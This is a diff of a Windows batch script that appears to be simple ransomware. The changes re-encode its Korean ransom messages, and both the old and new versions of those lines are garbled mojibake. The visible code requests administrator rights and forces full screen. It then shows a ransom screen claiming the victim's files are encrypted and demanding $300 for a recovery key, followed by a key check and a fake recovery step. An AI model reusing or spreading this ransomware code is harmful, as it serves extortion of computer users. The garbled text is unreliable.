@@ -5,7 +5,7 @@ powershell "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys({F11
 
 if '%errorlevel%' NEQ '0' (
 
-    echo °ü¸® ±ÇÇÑÀ» ¿äÃ» ...
+    echo ê´€ë¦¬ ê¶Œí•œì„ ìš”ì²­ ...
 
     goto UACPrompt
 
@@ -113,28 +113,28 @@ echo              Q What is Recover key?
 echo              A Recover key is %persenerkey%.
 echo              Do not forget this.
 echo              -----------------------------------------------------
-echo              ÇÑ±¹¾î                                               
-echo              ¿ó½º! ´ç½ÅÀÇ Áß¿äÇÑ ÆÄÀÏÀÌ ¾ÏÈ£È­ µÇ¾ú½À´Ï´Ù.        
-echo              Q ¾î¶»°Ô º¹±¸ÇÕ´Ï±î?                                 
-echo              A º¹±¸ Å°´Â º¹±¸¿¡ ÇÊ¿äÇÕ´Ï´Ù. º¹±¸ Å°¸¦ ¾òÀ¸·Á¸é    
-echo              300 $ÀÇ Å°¸¦ ±¸ÀÔÇÒ ¼ö ÀÖ½À´Ï´Ù.                     
+echo              í•œêµ­ì–´                                               
+echo              ì›ìŠ¤! ë‹¹ì‹ ì˜ ì¤‘ìš”í•œ íŒŒì¼ì´ ì•”í˜¸í™” ë˜ì—ˆìŠµë‹ˆë‹¤.        
+echo              Q ì–´ë–»ê²Œ ë³µêµ¬í•©ë‹ˆê¹Œ?                                 
+echo              A ë³µêµ¬ í‚¤ëŠ” ë³µêµ¬ì— í•„ìš”í•©ë‹ˆë‹¤. ë³µêµ¬ í‚¤ë¥¼ ì–»ìœ¼ë ¤ë©´    
+echo              300 $ì˜ í‚¤ë¥¼ êµ¬ìž…í•  ìˆ˜ ìžˆìŠµë‹ˆë‹¤.                     
 echo.
-echo              Q ¾îµð¼­ Å°¸¦ ±¸ÀÔÇÕ´Ï±î?                            
-echo              A ¾Æ¹« Å°³ª ´©¸£°í buy¸¦ ÀÔ·ÂÇÏ¸é ÀÚµ¿À¸·Î ÀÌµ¿ÇÕ´Ï´Ù
+echo              Q ì–´ë””ì„œ í‚¤ë¥¼ êµ¬ìž…í•©ë‹ˆê¹Œ?                            
+echo              A ì•„ë¬´ í‚¤ë‚˜ ëˆ„ë¥´ê³  buyë¥¼ ìž…ë ¥í•˜ë©´ ìžë™ìœ¼ë¡œ ì´ë™í•©ë‹ˆë‹¤
 echo.
-echo              Q ´Ù¸¥ Áú¹®ÀÌ ÀÖ½À´Ï´Ù.                              
-echo              A Áú¹® »çÀÌÆ®·Î ÀÌµ¿ÇÏ·Á¸é q¸¦ ÀÔ·ÂÇÏ½Ê½Ã¿À.      
+echo              Q ë‹¤ë¥¸ ì§ˆë¬¸ì´ ìžˆìŠµë‹ˆë‹¤.                              
+echo              A ì§ˆë¬¸ ì‚¬ì´íŠ¸ë¡œ ì´ë™í•˜ë ¤ë©´ që¥¼ ìž…ë ¥í•˜ì‹­ì‹œì˜¤.      
 echo.
-echo              Q º¹±¸ ÄÚµå°¡ ¹«¾ùÀÎ°¡¿ä?
-echo              A º¹±¸ ÄÚµå´Â %persenerkey% ÀÔ´Ï´Ù.
-echo              ÇØ´ç Å°¸¦ ÀØ¾î¹ö¸®´Â °æ¿ì, º¹±¸°¡ ºÒ°¡´É ÇÕ´Ï´Ù.
+echo              Q ë³µêµ¬ ì½”ë“œê°€ ë¬´ì—‡ì¸ê°€ìš”?
+echo              A ë³µêµ¬ ì½”ë“œëŠ” %persenerkey% ìž…ë‹ˆë‹¤.
+echo              í•´ë‹¹ í‚¤ë¥¼ ìžŠì–´ë²„ë¦¬ëŠ” ê²½ìš°, ë³µêµ¬ê°€ ë¶ˆê°€ëŠ¥ í•©ë‹ˆë‹¤.
 echo.
 echo.
 echo.
 echo.
 echo                         Press any key to enter
 echo.
-echo                      ÀÔ·ÂÇÏ·Á¸é ¾Æ¹«Å°³ª ´­·¯ÁÖ¼¼¿ä
+echo                      ìž…ë ¥í•˜ë ¤ë©´ ì•„ë¬´í‚¤ë‚˜ ëˆŒëŸ¬ì£¼ì„¸ìš”
 pause>nul
 set /p key=enter:
 if %key%==buy goto buy
@@ -142,7 +142,7 @@ if %key%==q goto q
 if %key%==%key1% goto unlock
 :a
 echo               The code is wrong. press any key
-echo             ÄÚµå°¡ Àß¸øµÇ¾ú½À´Ï´Ù. ¾Æ¹«Å°³ª ´­·¯ÁÖ¼¼¿ä
+echo             ì½”ë“œê°€ ìž˜ëª»ë˜ì—ˆìŠµë‹ˆë‹¤. ì•„ë¬´í‚¤ë‚˜ ëˆŒëŸ¬ì£¼ì„¸ìš”
 pause>nul
 goto next
 
@@ -152,13 +152,13 @@ echo                    It will automatically enter the site.
 echo                 If the site does not work, please enter the site
 echo            https://example.com
 echo.
-echo                     ÀÚµ¿À¸·Î »çÀÌÆ®¿¡ µé¾î°¡ Áý´Ï´Ù
-echo                     ¸¸¾à »çÀÌÆ®°¡ µé¾î°¡ÁöÁö ¾ÊÀ»°æ¿ì
-echo  https://example.com »çÀÌÆ®¿¡ ¼öµ¿À¸·Î µé¾î°¡¼¼¿ä
+echo                     ìžë™ìœ¼ë¡œ ì‚¬ì´íŠ¸ì— ë“¤ì–´ê°€ ì§‘ë‹ˆë‹¤
+echo                     ë§Œì•½ ì‚¬ì´íŠ¸ê°€ ë“¤ì–´ê°€ì§€ì§€ ì•Šì„ê²½ìš°
+echo  https://example.com ì‚¬ì´íŠ¸ì— ìˆ˜ë™ìœ¼ë¡œ ë“¤ì–´ê°€ì„¸ìš”
 echo.
 echo.
 echo                     Press any key to return to the first screen
-echo                     Ã¹ È­¸éÀ¸·Î µ¹¾Æ°¡·Á¸é ¾Æ¹«Å°³ª ´­·¯ÁÖ¼¼¿ä.
+echo                     ì²« í™”ë©´ìœ¼ë¡œ ëŒì•„ê°€ë ¤ë©´ ì•„ë¬´í‚¤ë‚˜ ëˆŒëŸ¬ì£¼ì„¸ìš”.
 pause>nul
 goto next
 
@@ -168,13 +168,13 @@ echo                    It will automatically enter the site.
 echo                 If the site does not work, please enter the site
 echo                 https://example.com manually
 echo.
-echo                     ÀÚµ¿À¸·Î »çÀÌÆ®¿¡ µé¾î°¡ Áý´Ï´Ù
-echo                     ¸¸¾à »çÀÌÆ®°¡ µé¾î°¡ÁöÁö ¾ÊÀ»°æ¿ì
-echo      https://example.com »çÀÌÆ®¿¡ ¼öµ¿À¸·Î µé¾î°¡¼¼¿ä
+echo                     ìžë™ìœ¼ë¡œ ì‚¬ì´íŠ¸ì— ë“¤ì–´ê°€ ì§‘ë‹ˆë‹¤
+echo                     ë§Œì•½ ì‚¬ì´íŠ¸ê°€ ë“¤ì–´ê°€ì§€ì§€ ì•Šì„ê²½ìš°
+echo      https://example.com ì‚¬ì´íŠ¸ì— ìˆ˜ë™ìœ¼ë¡œ ë“¤ì–´ê°€ì„¸ìš”
 echo.
 echo.
 echo                     Press any key to return to the first screen
-echo                     Ã¹ È­¸éÀ¸·Î µ¹¾Æ°¡·Á¸é ¾Æ¹«Å°³ª ´­·¯ÁÖ¼¼¿ä.
+echo                     ì²« í™”ë©´ìœ¼ë¡œ ëŒì•„ê°€ë ¤ë©´ ì•„ë¬´í‚¤ë‚˜ ëˆŒëŸ¬ì£¼ì„¸ìš”.
 pause>nul
 goto next
 
@@ -202,14 +202,14 @@ echo.
 echo.
 echo.
 echo               -----------------------------------------------------
-echo               ÇÑ±¹¾î                                               
+echo               í•œêµ­ì–´                                               
 echo.
 echo.
 echo.
 echo.
 echo.
 echo.
-echo                                    º¹±¸Áß...                       
+echo                                    ë³µêµ¬ì¤‘...                       
 echo.
 echo.
 echo.
@@ -252,14 +252,14 @@ echo.
 echo.
 echo.
 echo               -----------------------------------------------------
-echo               ÇÑ±¹¾î                                               
+echo               í•œêµ­ì–´                                               
 echo.
 echo.
 echo.
 echo.
 echo.
 echo.
-echo                                    º¹±¸ ¿Ï·á                       
+echo                                    ë³µêµ¬ ì™„ë£Œ                       
 echo.
 echo.
 echo.
@@ -270,7 +270,7 @@ echo              --------------------------------------------------------
 echo.
 echo.
 echo               Recovery is complete. Press any key to exit.
-echo             º¹±¸°¡ ¿Ï·áµÇ¾ú½À´Ï´Ù. ¾Æ¹«Å°³ª ´©¸£¸é Á¾·áµË´Ï´Ù.
+echo             ë³µêµ¬ê°€ ì™„ë£Œë˜ì—ˆìŠµë‹ˆë‹¤. ì•„ë¬´í‚¤ë‚˜ ëˆ„ë¥´ë©´ ì¢…ë£Œë©ë‹ˆë‹¤.
 rd %userprofile%\AppData\bachransome >nul
 pause>nul
 exit
